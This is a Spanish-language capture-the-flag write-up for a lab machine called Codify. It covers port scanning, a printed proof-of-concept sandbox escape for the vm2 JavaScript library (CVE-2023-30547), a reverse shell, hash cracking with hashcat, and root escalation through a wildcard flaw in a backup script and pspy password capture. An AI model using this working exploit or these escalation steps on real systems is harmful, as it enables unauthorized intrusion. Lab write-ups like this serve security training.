#code-review #password-brute-force #hashcat #javascript-library #mysql #nodejs #pspy #vm2

![](../../../Imágenes/Codify.png)

Codify es una máquina que aloja un sitio web para revisar código Node.js en un servidor web. Podemos conseguir un punto de apoyo en el sistema objetivo mediante la explotación de una vulnerabilidad de una librería JavaScript que el sitio utiliza para la revisión de código. Una vez dentro debemos movernos lateralmente hacia otro usuario gracias al hallazgo de un hash ubicado dentro de un fichero en el sistema y realizando su desencriptado. Finalmente, debemos escalar privilegios realizando fuerza bruta sobre un script encontrado en el sistema o, también, usando la herramienta PSPY que nos permitirá capturar la contraseña del usuario root.

## **Enumeración**

#### Nmap

El escaneo de puertos nos arroja la existencia de servicios como **SSH**, **HTTP** y un servicio **HTTP** alojado en el puerto 3000.

![](../../../Imágenes/Selection_001-1.png)

![](../../../Imágenes/Selection_002-1.png)

#### HTTP 3000/TCP

El puerto 3000 nos aporta mucha curiosidad, por lo que nos dirigimos hacia él mediante el navegador. El sitio nos muestra un editor de código para testear código escrito en lenguaje Node.js:

![](../../../Imágenes/Pasted-image-20240404132135.png)

Si nos dirigimos a la sección «About us» podemos obtener más información sobre el sitio y entender mejor su funcionamiento. Asimismo podemos ver que el editor utiliza una librería de **JavaScript** llamada **vm2**.

![](../../../Imágenes/Pasted-image-20240404133457.png)

Si clicamos en el enlace, podemos comprobar que se está usando la versión **3.9.16**. Realizando una búsqueda por los motores de búsqueda podemos comprobar que existe una vulnerabilidad para esta versión registrada como **[CVE-2023-30547](https://nvd.nist.gov/vuln/detail/CVE-2023-30547)**:

![](../../../Imágenes/image%201.png)

Existe un **[proof of concept](https://github.com/patriksimek/vm2/security/advisories/GHSA-ch3r-j5x3-6q2m)** de esta vulnerabilidad que nos sugiere el uso del siguiente código, el cual nos permite la ejecución de código arbitrario en el sistema objetivo:

```
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('echo pwned');
}
`

console.log(vm.run(code));
```

Si volvemos al sitio web y probamos el código podemos comprobar que se muestra por pantalla la palabra pwned, por lo tanto, la ejecución de comandos se está realizando correctamente.

![](../../../Imágenes/Pasted-image-20240404133530.png)

## **Usuario svc**

Ahora es hora de introducir un payload para obtener una reverse shell:

![](../../../Imágenes/Selection_004-1.png)

Una vez obtenido la shell en el sistema objetivo y estabilizarla, nos encontramos con que somos el usuario svc y que existe un usuario llamado joshua el cual no podemos acceder a su directorio dentro del Home.

![](../../../Imágenes/Selection_005-1.png)

## **Usuario joshua**

Después de realizar una enumeración del sistema nos encontramos que existe un archivo llamado **tickets.db** dentro de la carpeta **/var/www**. Este archivo parece contener el nombre de joshua (el cual no tenemos acceso) y lo que parece ser un hash.

![](../../../Imágenes/Selection_006-1-wpp1712234308114.png)

Así que nos dirigimos a copiar el hash y tratar de desencriptarlo en nuestro host de ataque mediante el uso de **Hashcat**:

![](../../../Imágenes/Selection_007-1-wpp1712234291287.png)

![](../../../Imágenes/Selection_008-1-wpp1712299328674.png)

Por suerte, logramos desencriptar la contraseña, cambiar de usuario hacia joshua y leer la bandera user.txt.

![](../../../Imágenes/Selection_009-1-wpp1712234194943.png)

## **Escalada de privilegios**

Rápidamente, comprobamos comandos que el usuario puede ejecutar con permisos root y nos entramos con que puede ejecutar un script que aparentemente realiza una copia de seguridad de la base de datos **MYSQL**.

![](../../../Imágenes/Selection_011-1.png)

Realizando la revisión de código de este script nos encontramos con que en primer lugar se hace una comprobación de la contraseña ubicada en el directorio de root con la contraseña que introduzcamos al ejecutar el script y, a continuación, si la contraseña introducida es válida se procede a realizar la copia de seguridad usando la contraseña root.

![](../../../Imágenes/Selection_012-1.png)

Si iniciamos el script y probamos cualquier contraseña, nos devuelve un mensaje de fallo de contraseña y se paraliza la ejecución del script. Pero, si usamos el comodín «*» la lógica del script da por buena la contraseña y sigue con su ejecución.

![](../../../Imágenes/Selection_013-1.png)

En este momento tenemos dos opciones:

1. Desarrollar un script para realizar fuerza bruta sobre la contraseña.
2. Utilizar **PSPY** para capturar la contraseña durante la ejecución del script.

Nosotros optamos por utilizar **PSPY**. Así que subimos el binario **PSPY64** en la máquina víctima y lo ejecutamos.

![](../../../Imágenes/Selection_016-1.png)

A continuación, ejecutamos el script introduciendo el comodín:

![](../../../Imágenes/Selection_017-1.png)

¡Y conseguimos la contraseña!

![](../../../Imágenes/Selection_018-1-wpp1712234137194.png)

Ahora, tratamos de usar la contraseña filtrada gracias a **PSPY** intentando cambiar hacia el usuario root, y finalmente, ¡conseguimos la bandera root.txt!

![](../../../Imágenes/Selection_019-1-wpp1712234073978.png)

![](../../../Imágenes/Selection_010-1%201.png)
